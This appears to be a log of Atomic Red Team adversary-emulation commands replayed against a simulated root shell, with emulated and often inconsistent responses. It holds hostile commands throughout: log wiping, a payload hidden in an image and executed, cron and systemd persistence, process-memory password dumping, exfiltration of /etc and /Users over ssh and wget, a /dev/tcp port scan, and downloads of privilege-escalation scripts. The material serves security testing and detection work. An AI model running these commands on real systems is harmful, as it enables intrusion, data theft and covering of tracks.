+response:touch -a -t 197001010000.00 /tmp/T1070.006-access.txt
+
+
+action:
+command:mkdir -p /tmp/victim-files/ && touch /tmp/victim-files/T1070.004-test.txt
+response:mkdir -p /tmp/victim-files/ && touch /tmp/victim-files/T1070.004-test.txt
+
+
+action:
+command:rm -f /tmp/victim-files/T1070.004-test.txt
+response:rm -f /tmp/victim-files/T1070.004-test.txt
+
+
+action:
+command:if grep -iq "debian\|ubuntu\|kali\|mint" /usr/lib/os-release; then apt update && apt install -y binutils curl sqlite3; fi
+response:if grep -iq "debian\|ubuntu\|kali\|mint" /usr/lib/os-release; then apt update && apt install -y binutils curl sqlite3; fi
+
+
+action:
+command:if grep -iq "rhel\|fedora\|centos" /usr/lib/os-release; then yum update -y && yum install -y binutils curl sqlite-devel; fi
+response:root@svr04:~# if grep -iq "rhel\|fedora\|centos" /usr/lib/os-release; then yum update -y && yum install -y binutils curl sqlite-devel; fi
+bash: if: command not found
+bash: then: command not found
+bash: yum: command not found
+bash: fi: command not found
+root@svr04:~# 
+
+action:
+command:cd $HOME
+response:cd $HOME
+
+
+action:
+command:curl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/art
+response:curl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/art
+b'curl: Remote file name has no length!\n'root@svr04:~# 
+
+action:
+command:curl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/gta.db
+response:curl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/gta.db
+
+
+action:
+command:curl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/sqlite_dump.sh
+response:curl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/sqlite_dump.sh
+Blocked command!
+b'curl: Remote file name has no length!\n'root@svr04:~# 
+
+action:
+command:chmod +x sqlite_dump.sh
+response:chmod +x sqlite_dump.sh
+chmod: cannot access x: No such file or directory
+chmod: cannot access sqlite_dump.sh: No such file or directory
+root@svr04:~# 
+
+action:
+command:find . ! -executable -exec bash -c 'if [[ "$(head -c 15 {} | strings)" == "SQLite format 3" ]]; then echo "{}"; ./sqlite_dump.sh {}; fi' \;
+response:find . ! -executable -exec bash -c 'if [[ "$(head -c 15 {} | strings)" == "SQLite format 3" ]]; then echo "{}"; ./sqlite_dump.sh {}; fi' \;
+bash: find: command not found
+root@svr04:~# 
+
+action:
+command:echo '' > /var/log/messages
+response:echo '' > /var/log/messages
+
+
+action:
+command:cat "/home/atomic/script.sh" | base64 | xxd -p | sed 's/../& /g' | xargs -n1 | xxd -r -p | cat "/home/atomic/image.jpg" - > "/home/atomic/evil_image.jpg"; strings "/home/atomic/evil_image.jpg" | tail -n 1 | base64 -d | sh
+response:cat "/home/atomic/script.sh" | base64 | xxd -p | sed 's/../& /g' | xargs -n1 | xxd -r -p | cat "/home/atomic/image.jpg" - > "/home/atomic/evil_image.jpg"; strings "/home/atomic/evil_image.jpg" | tail -n 1 | base64 -d | sh
+
+
+action:
+command:crontab -l > /tmp/notevil
+response:crontab -l > /tmp/notevil
+Blocked command!
+bash: base64: command not found
+bash: crontab: command not found
+root@svr04:~# 
+
+action:
+command:echo "* * * * * /tmp/evil.sh" > /tmp/persistevil && crontab /tmp/persistevil
+response:echo "* * * * * /tmp/evil.sh" > /tmp/persistevil && crontab /tmp/persistevil
+Blocked command!
+
+
+action:
+command:echo "[Unit]" > /etc/systemd/system/art-timer.service
+response:echo "[Unit]" > /etc/systemd/system/art-timer.service
+bash: crontab: command not found
+
+
+action:
+command:echo "Description=Atomic Red Team Systemd Timer Service" >> /etc/systemd/system/art-timer.service
+response:echo "Description=Atomic Red Team Systemd Timer Service" >> /etc/systemd/system/art-timer.service
+
+
+action:
+command:echo "[Service]" >> /etc/systemd/system/art-timer.service
+response:echo "[Service]" >> /etc/systemd/system/art-timer.service
+
+
+action:
+command:echo "Type=simple" >> /etc/systemd/system/art-timer.service
+response:echo "Type=simple" >> /etc/systemd/system/art-timer.service
+
+
+action:
+command:echo "ExecStart=/bin/touch /tmp/art-systemd-timer-marker" >> /etc/systemd/system/art-timer.service
+response:root@svr04:~# echo "ExecStart=/bin/touch /tmp/art-systemd-timer-marker" >> /etc/systemd/system/art-timer.service
+
+
+action:
+command:echo "[Install]" >> /etc/systemd/system/art-timer.service
+response:echo "[Install]" >> /etc/systemd/system/art-timer.service
+Blocked command!
+
+
+action:
+command:whoami
+response:whoami
+root
+root@svr04:~# 
+
+action:
+command:if grep -iq "debian\|ubuntu\|kali\|mint" /usr/lib/os-release; then apt update && apt install -y binutils curl sqlite3; fi
+response:if grep -iq "debian\|ubuntu\|kali\|mint" /usr/lib/os-release; then apt update && apt install -y binutils curl sqlite3; fi
+bash: if: command not found
+bash: then: command not found
+bash: apt: command not found
+bash: fi: command not found
+root@svr04:~# 
+
+action:
+command:if grep -iq "rhel\|fedora\|centos" /usr/lib/os-release; then yum update -y && yum install -y binutils curl sqlite-devel; fi
+response:if grep -iq "rhel\|fedora\|centos" /usr/lib/os-release; then yum update -y && yum install -y binutils curl sqlite-devel; fi
+bash: if: command not found
+bash: then: command not found
+bash: yum: command not found
+bash: fi: command not found
+root@svr04:~# 
+
+action:
+command:cd $HOME
+response:cd $HOME
+bash: cd: $: No such file or directory
+root@svr04:~# 
+
+action:
+command:curl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/art
+response:curl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/art
+b'curl: Remote file name has no length!\n'root@svr04:~# 
+
+action:
+command:curl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/gta.db
+response:curl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/gta.db
+
+
+action:
+command:curl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/sqlite_dump.sh
+response:curl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/sqlite_dump.sh
+
+
+action:
+command:chmod +x sqlite_dump.sh
+response:chmod +x sqlite_dump.sh
+Blocked command!
+chmod: cannot access x: No such file or directory
+chmod: cannot access sqlite_dump.sh: No such file or directory
+root@svr04:~# 
+
+action:
+command:find . ! -executable -exec bash -c 'if [[ "$(head -c 15 {} | strings)" == "SQLite format 3" ]]; then echo "{}"; ./sqlite_dump.sh {}; fi' \;
+response:find . ! -executable -exec bash -c 'if [[ "$(head -c 15 {} | strings)" == "SQLite format 3" ]]; then echo "{}"; ./sqlite_dump.sh {}; fi' \;
+bash: find: command not found
+root@svr04:~# 
+
+action:
+command:echo "echo '*/5     *       *       *       *       root    echo "Hello from Atomic Red Team"' > /tmp/atomic.log" > /etc/cron.d/persistevil
+response:echo "echo '*/5     *       *       *       *       root    echo "Hello from Atomic Red Team"' > /tmp/atomic.log" > /etc/cron.d/persistevil
+
+
+action:
+command:ssh target.example.com "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz
+response:ssh target.example.com "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz
+
+
+action:
+command:if grep -iq "debian\|ubuntu\|kali\|mint" /usr/lib/os-release; then apt update && apt install -y binutils curl sqlite3; fi
+response:if grep -iq "debian\|ubuntu\|kali\|mint" /usr/lib/os-release; then apt update && apt install -y binutils curl sqlite3; fi
+bash: if: command not found
+bash: then: command not found
+bash: apt: command not found
+bash: fi: command not found
+root@svr04:~# 
+
+action:
+command:whoami
+response:root@svr04:~# whoami
+root
+root@svr04:~# 
+
+action:
+command:curl --create-dirs https://raw.githubusercontent.com/rebootuser/LinEnum/c47f9b226d3ce2848629f25fe142c1b2986bc427/LinEnum.sh --output /home/atomic/T1059.004/src/LinEnum.sh
+response:curl --create-dirs https://raw.githubusercontent.com/rebootuser/LinEnum/c47f9b226d3ce2848629f25fe142c1b2986bc427/LinEnum.sh --output /home/atomic/T1059.004/src/LinEnum.sh
+
+
+action:
+command:chmod +x /home/atomic/T1059.004/src/LinEnum.sh
+response:chmod +x /home/atomic/T1059.004/src/LinEnum.sh
+
+
+action:
+command:bash /home/atomic/T1059.004/src/LinEnum.sh
+response:bash /home/atomic/T1059.004/src/LinEnum.sh
+
+
+action:
+command:[ "$(uname)" = 'FreeBSD' ] && alias python3=python3.9
+response:[ "$(uname)" = 'FreeBSD' ] && alias python3=python3.9
+
+
+action:
+command:if [ $(which python3) ]; then cd /tmp; python3 -m http.server 9090 & PID=$!; sleep 10; kill $PID; unset PID; fi
+response:if [ $(which python3) ]; then cd /tmp; python3 -m http.server 9090 & PID=$!; sleep 10; kill $PID; unset PID; fi
+
+
+action:
+command:echo '#!/bin/sh' > /tmp/T1003.007.sh
+response:echo '#!/bin/sh' > /tmp/T1003.007.sh
+
+
+action:
+command:echo "sh -c 'echo \"The password is T1003.007\" && sleep 30' &" >> /tmp/T1003.007.sh
+response:echo "sh -c 'echo \"The password is T1003.007\" && sleep 30' &" >> /tmp/T1003.007.sh
+
+
+action:
+command:sh /tmp/T1003.007.sh
+response:sh /tmp/T1003.007.sh
+
+
+action:
+command:PID=$(pgrep -n -f "T1003.007")
+response:PID=$(pgrep -n -f "T1003.007")
+
+
+action:
+command:MEM_START=$(head -n 5 /proc/"${PID}"/map | tail -1 | cut -d' ' -f1)
+response:MEM_START=$(head -n 5 /proc/"${PID}"/map | tail -1 | cut -d' ' -f1)
+
+
+action:
+command:MEM_STOP=$(head -n 5 /proc/"${PID}"/map | tail -1 | cut -d' ' -f2)
+response:MEM_STOP=$(head -n 5 /proc/"${PID}"/map | tail -1 | cut -d' ' -f2)
+
+
+action:
+command:MEM_SIZE=$(echo $(($MEM_STOP-$MEM_START)))
+response:MEM_SIZE=$(echo $(($MEM_STOP-$MEM_START)))
+
+
+action:
+command:dd if=/proc/"${PID}"/mem of="/tmp/T1003.007.bin" ibs=1 skip="$MEM_START" count="$MEM_SIZE"
+response:dd if=/proc/"${PID}"/mem of="/tmp/T1003.007.bin" ibs=1 skip="$MEM_START" count="$MEM_SIZE"
+
+
+action:
+command:whoami
+response:root@svr04:~# whoami
+root
+root@svr04:~# 
+
+action:
+command:if grep -iq "debian\|ubuntu\|kali\|mint" /usr/lib/os-release; then apt update && apt install -y binutils curl sqlite3; fi
+response:if grep -iq "debian\|ubuntu\|kali\|mint" /usr/lib/os-release; then apt update && apt install -y binutils curl sqlite3; fi
+bash: if: command not found
+bash: then: command not found
+bash: apt: command not found
+bash: fi: command not found
+root@svr04:~# 
+
+action:
+command:if grep -iq "rhel\|fedora\|centos" /usr/lib/os-release; then yum update -y && yum install -y binutils curl sqlite-devel; fi
+response:if grep -iq "rhel\|fedora\|centos" /usr/lib/os-release; then yum update -y && yum install -y binutils curl sqlite-devel; fi
+bash: if: command not found
+bash: then: command not found
+bash: yum: command not found
+bash: fi: command not found
+root@svr04:~# 
+
+action:
+command:cd $HOME
+response:cd $HOME
+
+
+action:
+command:whoami
+response:root@svr04:~# whoami
+root
+root@svr04:~# 
+
+action:
+command:tar czpf - /Users/* | openssl des3 -salt -pass atomic | ssh atomic@target.example.com 'cat > /Users.tar.gz.enc'
+response:tar czpf - /Users/* | openssl des3 -salt -pass atomic | ssh atomic@target.example.com 'cat > /Users.tar.gz.enc'
+
+
+action:
+command:if grep -iq "debian\|ubuntu\|kali\|mint" /usr/lib/os-release; then apt update && apt install -y binutils curl sqlite3; fi
+response:if grep -iq "debian\|ubuntu\|kali\|mint" /usr/lib/os-release; then apt update && apt install -y binutils curl sqlite3; fi
+bash: if: command not found
+bash: then: command not found
+bash: apt: command not found
+bash: fi: command not found
+root@svr04:~# 
+
+action:
+command:if grep -iq "rhel\|fedora\|centos" /usr/lib/os-release; then yum update -y && yum install -y binutils curl sqlite-devel; fi
+response:if grep -iq "rhel\|fedora\|centos" /usr/lib/os-release; then yum update -y && yum install -y binutils curl sqlite-devel; fi
+bash: if: command not found
+bash: then: command not found
+bash: yum: command not found
+bash: fi: command not found
+root@svr04:~# 
+
+action:
+command:cd $HOME
+response:cd $HOME
+
+
+action:
+command:curl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/art
+response:curl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/art
+b'curl: Remote file name has no length!\n'root@svr04:~# 
+
+action:
+command:curl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/gta.db
+response:curl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/gta.db
+b'curl: Remote file name has no length!\n'root@svr04:~# 
+
+action:
+command:curl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/sqlite_dump.sh
+response:curl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/sqlite_dump.sh
+b'curl: Remote file name has no length!\n'root@svr04:~# 
+
+action:
+command:chmod +x sqlite_dump.sh
+response:chmod +x sqlite_dump.sh
+chmod: cannot access x: No such file or directory
+chmod: cannot access sqlite_dump.sh: No such file or directory
+root@svr04:~# 
+
+action:
+command:find . ! -executable -exec bash -c 'if [[ "$(head -c 15 {} | strings)" == "SQLite format 3" ]]; then echo "{}"; ./sqlite_dump.sh {}; fi' \;
+response:find . ! -executable -exec bash -c 'if [[ "$(head -c 15 {} | strings)" == "SQLite format 3" ]]; then echo "{}"; ./sqlite_dump.sh {}; fi' \;
+bash: find: command not found
+root@svr04:~# 
+
+action:
+command:if [ "$(uname)" = 'FreeBSD' ]; then service -e; else systemctl --type=service; fi;
+response:if [ "$(uname)" = 'FreeBSD' ]; then service -e; else systemctl --type=service; fi;
+bash: if: command not found
+bash: then: command not found
+bash: else: command not found
+bash: fi: command not found
+root@svr04:~# 
+
+action:
+command:cat "/home/atomic/script.sh" | base64 | xxd -p | sed 's/../& /g' | xargs -n1 | xxd -r -p | cat "/home/atomic/image.jpg" - > "/home/atomic/evil_image.jpg"; strings "/home/atomic/evil_image.jpg" | tail -n 1 | base64 -d | sh
+response:cat "/home/atomic/script.sh" | base64 | xxd -p | sed 's/../& /g' | xargs -n1 | xxd -r -p | cat "/home/atomic/image.jpg" - > "/home/atomic/evil_image.jpg"; strings "/home/atomic/evil_image.jpg" | tail -n 1 | base64 -d | sh
+
+
+action:
+command:echo '#!/bin/sh' > /tmp/T1003.007.sh
+response:echo '#!/bin/sh' > /tmp/T1003.007.sh
+
+
+action:
+command:echo "sh -c 'echo \"The password is T1003.007\" && sleep 30' &" >> /tmp/T1003.007.sh
+response:echo "sh -c 'echo \"The password is T1003.007\" && sleep 30' &" >> /tmp/T1003.007.sh
+
+
+action:
+command:sh /tmp/T1003.007.sh
+response:root@svr04:~# sh /tmp/T1003.007.sh
+root@svr04:~# 
+
+action:
+command:PID=$(pgrep -n -f "T1003.007")
+response:PID=$(pgrep -n -f "T1003.007")
+bash: $: command not found
+root@svr04:~# 
+
+action:
+command:MEM_START=$(head -n 5 /proc/"${PID}"/map | tail -1 | cut -d' ' -f1)
+response:MEM_START=$(head -n 5 /proc/"${PID}"/map | tail -1 | cut -d' ' -f1)
+bash: syntax error: unexpected end of file
+root@svr04:~# 
+
+action:
+command:MEM_STOP=$(head -n 5 /proc/"${PID}"/map | tail -1 | cut -d' ' -f2)
+response:MEM_STOP=$(head -n 5 /proc/"${PID}"/map | tail -1 | cut -d' ' -f2)
+bash: syntax error: unexpected end of file
+root@svr04:~# 
+
+action:
+command:MEM_SIZE=$(echo $(($MEM_STOP-$MEM_START)))
+response:MEM_SIZE=$(echo $(($MEM_STOP-$MEM_START)))
+bash: $: command not found
+root@svr04:~# 
+
+action:
+command:dd if=/proc/"${PID}"/mem of="/tmp/T1003.007.bin" ibs=1 skip="$MEM_START" count="$MEM_SIZE"
+response:dd if=/proc/"${PID}"/mem of="/tmp/T1003.007.bin" ibs=1 skip="$MEM_START" count="$MEM_SIZE"
+
+
+action:
+command:strings "/tmp/T1003.007.bin" | grep -i PASS
+response:strings "/tmp/T1003.007.bin" | grep -i PASS
+Blocked command!
+bash: strings: command not found
+root@svr04:~# 
+
+action:
+command:echo ""
+response:echo ""
+
+
+action:
+command:auditctl -a always,exit -F arch=b64 -S execve -k CMDS 
+response:auditctl -a always,exit -F arch=b64 -S execve -k CMDS 
+bash: auditctl: command not found
+root@svr04:~# 
+
+action:
+command:whoami
+response:root@svr04:~# whoami
+
+
+action:
+command:curl -s -A "HttpBrowser/1.0" -m3 www.google.com
+response:curl -s -A "HttpBrowser/1.0" -m3 www.google.com
+
+
+action:
+command:curl -s -A "Wget/1.9+cvs-stable (Red Hat modified)" -m3 www.google.com
+response:curl -s -A "Wget/1.9+cvs-stable (Red Hat modified)" -m3 www.google.com
+Blocked command!
+
+
+action:
+command:curl -s -A "Opera/8.81 (Windows NT 6.0; U; en)" -m3 www.google.com
+response:curl -s -A "Opera/8.81 (Windows NT 6.0; U; en)" -m3 www.google.com
+
+
+action:
+command:curl -s -A "*<|>*" -m3 www.google.com
+response:curl -s -A "*<|>*" -m3 www.google.com
+
+
+action:
+command:if grep -iq "debian\|ubuntu\|kali\|mint" /usr/lib/os-release; then apt update && apt install -y binutils curl sqlite3; fi
+response:if grep -iq "debian\|ubuntu\|kali\|mint" /usr/lib/os-release; then apt update && apt install -y binutils curl sqlite3; fi
+
+
+action:
+command:if grep -iq "rhel\|fedora\|centos" /usr/lib/os-release; then yum update -y && yum install -y binutils curl sqlite-devel; fi
+response:if grep -iq "rhel\|fedora\|centos" /usr/lib/os-release; then yum update -y && yum install -y binutils curl sqlite-devel; fi
+
+
+action:
+command:cd $HOME
+response:cd $HOME
+
+
+action:
+command:curl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/art
+response:curl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/art
+
+
+action:
+command:curl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/gta.db
+response:curl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/gta.db
+
+
+action:
+command:curl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/sqlite_dump.sh
+response:curl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/sqlite_dump.sh
+
+
+action:
+command:chmod +x sqlite_dump.sh
+response:chmod +x sqlite_dump.sh
+
+
+action:
+command:find . ! -executable -exec bash -c 'if [[ "$(head -c 15 {} | strings)" == "SQLite format 3" ]]; then echo "{}"; ./sqlite_dump.sh {}; fi' \;
+response:find . ! -executable -exec bash -c 'if [[ "$(head -c 15 {} | strings)" == "SQLite format 3" ]]; then echo "{}"; ./sqlite_dump.sh {}; fi' \;
+
+
+action:
+command:if grep -iq "debian\|ubuntu\|kali\|mint" /usr/lib/os-release; then apt update && apt install -y binutils curl sqlite3; fi
+response:if grep -iq "debian\|ubuntu\|kali\|mint" /usr/lib/os-release; then apt update && apt install -y binutils curl sqlite3; fi
+
+
+action:
+command:if grep -iq "rhel\|fedora\|centos" /usr/lib/os-release; then yum update -y && yum install -y binutils curl sqlite-devel; fi
+response:if grep -iq "rhel\|fedora\|centos" /usr/lib/os-release; then yum update -y && yum install -y binutils curl sqlite-devel; fi
+
+
+action:
+command:cd $HOME
+response:cd $HOME
+
+
+action:
+command:curl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/art
+response:root@svr04:~# curl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/art
+
+
+action:
+command:curl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/gta.db
+response:curl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/gta.db
+
+
+action:
+command:curl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/sqlite_dump.sh
+response:curl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/sqlite_dump.sh
+
+
+action:
+command:chmod +x sqlite_dump.sh
+response:chmod +x sqlite_dump.sh
+chmod: cannot access x: No such file or directory
+chmod: cannot access sqlite_dump.sh: No such file or directory
+root@svr04:~# 
+
+action:
+command:find . ! -executable -exec bash -c 'if [[ "$(head -c 15 {} | strings)" == "SQLite format 3" ]]; then echo "{}"; ./sqlite_dump.sh {}; fi' \;
+response:find . ! -executable -exec bash -c 'if [[ "$(head -c 15 {} | strings)" == "SQLite format 3" ]]; then echo "{}"; ./sqlite_dump.sh {}; fi' \;
+bash: find: command not found
+root@svr04:~# 
+
+action:
+command:echo '#!/bin/sh' > /tmp/T1003.007.sh
+response:echo '#!/bin/sh' > /tmp/T1003.007.sh
+
+
+action:
+command:echo "sh -c 'echo \"The password is T1003.007\" && sleep 30' &" >> /tmp/T1003.007.sh
+response:echo "sh -c 'echo \"The password is T1003.007\" && sleep 30' &" >> /tmp/T1003.007.sh
+
+
+action:
+command:sh /tmp/T1003.007.sh
+response:sh /tmp/T1003.007.sh
+root@svr04:~# 
+
+action:
+command:PID=$(pgrep -n -f "T1003.007")
+response:PID=$(pgrep -n -f "T1003.007")
+bash: $: command not found
+root@svr04:~# 
+
+action:
+command:HEAP_MEM=$(grep -E "^[0-9a-f-]* r" /proc/"$PID"/maps | grep heap | cut -d' ' -f 1)
+response:HEAP_MEM=$(grep -E "^[0-9a-f-]* r" /proc/"$PID"/maps | grep heap | cut -d' ' -f 1)
+bash: syntax error: unexpected end of file
+root@svr04:~# 
+
+action:
+command:MEM_START=$(echo $((0x$(echo "$HEAP_MEM" | cut -d"-" -f1))))
+response:MEM_START=$(echo $((0x$(echo "$HEAP_MEM" | cut -d"-" -f1))))
+bash: cut: command not found
+root@svr04:~# bash: $: command not found
+root@svr04:~# 
+
+action:
+command:MEM_STOP=$(echo $((0x$(echo "$HEAP_MEM" | cut -d"-" -f2))))
+response:MEM_STOP=$(echo $((0x$(echo "$HEAP_MEM" | cut -d"-" -f2))))
+bash: cut: command not found
+root@svr04:~# bash: $: command not found
+root@svr04:~# 
+
+action:
+command:whoami
+response:whoami
+Blocked command!
+root
+root@svr04:~# 
+
+action:
+command:whoami
+response:root@svr04:~# whoami
+
+
+action:
+command:ps >> /tmp/loot.txt
+response:ps >> /tmp/loot.txt
+Blocked command!
+
+
+action:
+command:whoami
+response:root@svr04:~# whoami
+
+
+action:
+command:wget --post-file="/home/atomic/T1048.002/src/artifact" --timeout=5 --no-check-certificate https://example.com/ --delete-after
+response:wget --post-file="/home/atomic/T1048.002/src/artifact" --timeout=5 --no-check-certificate https://example.com/ --delete-after
+Blocked command!
+Unrecognized option
+root@svr04:~# 
+
+action:
+command:whoami
+response:root@svr04:~# whoami
+
+
+action:
+command:touch /tmp/victim-shred.txt
+response:touch /tmp/victim-shred.txt
+
+
+action:
+command:shred -u /tmp/victim-shred.txt
+response:shred -u /tmp/victim-shred.txt
+bash: shred: command not found
+root@svr04:~# 
+
+action:
+command:whoami
+response:whoami
+root
+root@svr04:~# 
+
+action:
+command:echo "Install netstat on the machine."; exit 1;
+response:echo "Install netstat on the machine."; exit 1;
+
+
+action:
+command:netstat
+response:netstat
+
+
+action:
+command:who -a
+response:who -a
+
+
+action:
+command:for port in {1..65535}; do (2>/dev/null echo >/dev/tcp/192.168.1.1/$port) && echo port $port is open ; done
+response:for port in {1..65535}; do (2>/dev/null echo >/dev/tcp/192.168.1.1/$port) && echo port $port is open ; done
+
+
+action:
+command:whoami
+response:root@svr04:~# whoami
+root
+root@svr04:~# 
+
+action:
+command:pip install requests    
+response:pip install requests    
+bash: pip: command not found
+root@svr04:~# 
+
+action:
+command:which_python=$(which python || which python3 || which python3.9 || which python2)
+response:which_python=$(which python || which python3 || which python3.9 || which python2)
+bash: $: command not found
+Blocked command!
+
+
+action:
+command:echo 'import requests' > T1059.006.py
+response:echo 'import requests' > T1059.006.py
+
+
+action:
+command:echo 'import os' >> T1059.006.py
+response:echo 'import os' >> T1059.006.py
+
+
+action:
+command:echo 'url = "https://github.com/carlospolop/PEASS-ng/releases/download/20220214/linpeas.sh"' >> T1059.006.py
+response:echo 'url = "https://github.com/carlospolop/PEASS-ng/releases/download/20220214/linpeas.sh"' >> T1059.006.py
+Blocked command!
+
+
+action:
+command:whoami
+response:root@svr04:~# whoami
+
+
+action:
+command:if grep -iq "debian\|ubuntu\|kali\|mint" /usr/lib/os-release; then apt update && apt install -y binutils curl sqlite3; fi
+response:if grep -iq "debian\|ubuntu\|kali\|mint" /usr/lib/os-release; then apt update && apt install -y binutils curl sqlite3; fi
+bash: if: command not found
+bash: then: command not found
+bash: apt: command not found
+bash: fi: command not found
+root@svr04:~# 
+
+action:
+command:if grep -iq "rhel\|fedora\|centos" /usr/lib/os-release; then yum update -y && yum install -y binutils curl sqlite-devel; fi
+response:if grep -iq "rhel\|fedora\|centos" /usr/lib/os-release; then yum update -y && yum install -y binutils curl sqlite-devel; fi
+bash: if: command not found
+bash: then: command not found
+bash: yum: command not found
+bash: fi: command not found
+root@svr04:~# 
+
+action:
+command:cd $HOME
+response:cd $HOME
+
+
+action:
+command:curl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/art
+response:curl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/art
+
+
+action:
+command:whoami
+response:whoami
+root
+root@svr04:~# 
+
+action:
+command:if grep -iq "debian\|ubuntu\|kali\|mint" /usr/lib/os-release; then apt update && apt install -y binutils curl sqlite3; fi
+response:if grep -iq "debian\|ubuntu\|kali\|mint" /usr/lib/os-release; then apt update && apt install -y binutils curl sqlite3; fi
+bash: if: command not found
+bash: then: command not found
+bash: apt: command not found
+bash: fi: command not found
+root@svr04:~# 
+
+action:
+command:if grep -iq "rhel\|fedora\|centos" /usr/lib/os-release; then yum update -y && yum install -y binutils curl sqlite-devel; fi
+response:if grep -iq "rhel\|fedora\|centos" /usr/lib/os-release; then yum update -y && yum install -y binutils curl sqlite-devel; fi
+bash: if: command not found
+bash: then: command not found
+bash: yum: command not found
+bash: fi: command not found
+root@svr04:~# 
+
+action:
+command:cd $HOME
+response:cd $HOME
+
+
+action:
+command:whoami
+response:root@svr04:~# whoami
+root
+root@svr04:~# 
+
+action:
+command:echo '#!/bin/sh' > /tmp/T1003.007.sh
+response:echo '#!/bin/sh' > /tmp/T1003.007.sh
+
+
+action:
+command:echo "sh -c 'echo \"The password is T1003.007\" && sleep 30' &" >> /tmp/T1003.007.sh
+response:echo "sh -c 'echo \"The password is T1003.007\" && sleep 30' &" >> /tmp/T1003.007.sh
+
+
+action:
+command:echo "Python 2.7+ or 3.4+ must be installed"
+response:echo "Python 2.7+ or 3.4+ must be installed"
+
+
+action:
+command:sh /tmp/T1003.007.sh
+response:sh /tmp/T1003.007.sh
+Blocked command!
+root@svr04:~# 
+
+action:
+command:whoami
+response:root@svr04:~# whoami
+root
+root@svr04:~# 
+
+action:
+command:if grep -iq "debian\|ubuntu\|kali\|mint" /usr/lib/os-release; then apt update && apt install -y binutils curl sqlite3; fi
+response:if grep -iq "debian\|ubuntu\|kali\|mint" /usr/lib/os-release; then apt update && apt install -y binutils curl sqlite3; fi
+bash: if: command not found
+bash: then: command not found
+bash: apt: command not found
+bash: fi: command not found
+root@svr04:~# 
+
+action:
+command:if grep -iq "rhel\|fedora\|centos" /usr/lib/os-release; then yum update -y && yum install -y binutils curl sqlite-devel; fi
+response:if grep -iq "rhel\|fedora\|centos" /usr/lib/os-release; then yum update -y && yum install -y binutils curl sqlite-devel; fi
+bash: if: command not found
+bash: then: command not found
+bash: yum: command not found
+bash: fi: command not found
+root@svr04:~# 
+
+action:
+command:whoami
+response:whoami
+
+
+action:
+command:if grep -iq "debian\|ubuntu\|kali\|mint" /usr/lib/os-release; then apt update && apt install -y binutils curl sqlite3; fi
+response:if grep -iq "debian\|ubuntu\|kali\|mint" /usr/lib/os-release; then apt update && apt install -y binutils curl sqlite3; fi
+bash: if: command not found
+bash: then: command not found
+bash: apt: command not found
+bash: fi: command not found
+root@svr04:~# 
+
+action:
+command:whoami
+response:root@svr04:~# whoami
+
+
+action:
+command:mkdir -p /tmp/victim-files/ && touch /tmp/victim-files/T1070.004-test.txt
+response:mkdir -p /tmp/victim-files/ && touch /tmp/victim-files/T1070.004-test.txt
+Blocked command!
+touch: cannot touch `/tmp/victim-files/T1070.004-test.txt`: no such file or directory
+root@svr04:~# 
+
+action:
+command:rm -f /tmp/victim-files/T1070.004-test.txt
+response:rm -f /tmp/victim-files/T1070.004-test.txt
+
+
+action:
+command:whoami
+response:root@svr04:~# whoami
+root
+root@svr04:~# 
+
+action:
+command:ls -a >> /tmp/T1083.txt
+response:ls -a >> /tmp/T1083.txt
+
+
+action:
+command:if [ -d /Library/Preferences/ ]; then ls -la /Library/Preferences/ > /tmp/T1083.txt; fi;
+response:if [ -d /Library/Preferences/ ]; then ls -la /Library/Preferences/ > /tmp/T1083.txt; fi;
+bash: if: command not found
+bash: then: command not found
+bash: fi: command not found
+root@svr04:~# 
+
+action:
+command:file */* *>> /tmp/T1083.txt
+response:file */* *>> /tmp/T1083.txt
+bash: file: command not found
+root@svr04:~# 
+
+action:
+command:cat /tmp/T1083.txt 2>/dev/null
+response:cat /tmp/T1083.txt 2>/dev/null
+
+
+action:
+command:find . -type f
+response:find . -type f
+bash: find: command not found
+root@svr04:~# 
+
+action:
+command:ls -R | grep ":$" | sed -e 's/:$//' -e 's/[^-][^\/]*\//--/g' -e 's/^/ /' -e 's/-/|/'
